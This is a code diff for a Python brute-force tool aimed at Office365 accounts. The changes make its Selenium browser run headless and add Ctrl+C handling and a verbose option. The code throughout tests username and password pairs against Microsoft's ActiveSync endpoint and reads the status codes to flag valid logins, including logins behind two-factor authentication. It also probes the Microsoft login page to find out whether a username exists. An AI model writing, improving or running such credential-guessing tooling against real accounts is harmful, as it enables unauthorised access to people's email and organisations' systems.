@@ -14,6 +14,7 @@ from colorama import init, Fore
 from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.options import Options
 
 init()
 
@@ -56,31 +57,36 @@ d8888b.  .d88b.  db    db d8b   db d8888b.  .d88b.
     
 def brute_office(username,password):
 
-    check_user = check_o365(username)
-    if(check_user == None):
-        print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
-        sys.exit(0)
-    elif (check_user == True):
-        #TODO: run bruter
-        header = {"MS-ASProtocolVersion": "14.0"
-            }
-        LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
-        STATUS_CODES = {"200": "VALID USERPASS",
-                        "401": "VALID USERNAME ONLY",
-                        "403": "VALID USERPASS WITH 2FA",
-                        "404": "INVALID USERNAME"
-                    }
-        r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)
-        
-        color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
-        print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
-        
-    elif(check_user == False):
-        print(Fore.RED+"[+] Error! Invalid username")  
-        sys.exit(0)
-    else:
-        print(Fore.RED+"[+] Error! Unknown Error")
-        sys.exit(0)
+    try:
+        print("Checking credentials {0}:{1}".format(username, password))
+        check_user = check_o365(username)
+        if(check_user == None):
+            print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
+            sys.exit(0)
+        elif (check_user == True):
+            #TODO: run bruter
+            header = {"MS-ASProtocolVersion": "14.0"
+                }
+            LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+            STATUS_CODES = {"200": "VALID USERPASS",
+                            "401": "VALID USERNAME ONLY",
+                            "403": "VALID USERPASS WITH 2FA",
+                            "404": "INVALID USERNAME"
+                        }
+            r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)
+
+            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
+            print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
+
+        elif(check_user == False):
+            print(Fore.RED+"[+] Error! Invalid username")  
+            sys.exit(0)
+        else:
+            print(Fore.RED+"[+] Error! Unknown Error")
+            sys.exit(0)
+    
+    except KeyboardInterrupt:
+        print("[!] Detected Ctrl + C. Shutting down...")
         
 
 
@@ -98,7 +104,9 @@ def check_o365(username):
     for line in url_dict:
         try:
             socket.gethostbyname(domain + url_dict[line])
-            driver = webdriver.Chrome()
+            options = Options()
+            options.add_argument("--headless")
+            driver = webdriver.Chrome(options=options)
             driver.get("https://login.microsoftonline.com")
             element = driver.find_element_by_name("loginfmt")
             element.send_keys(username)
@@ -186,7 +194,8 @@ if __name__ == '__main__':
     userfile = options.userfile
     passfile = options.passfile
     policy = options.policy
-
+    verbose = options.verbose
+    
     if username and userfile:
         ArgumentParser().print_usage()
         sys.exit(0)
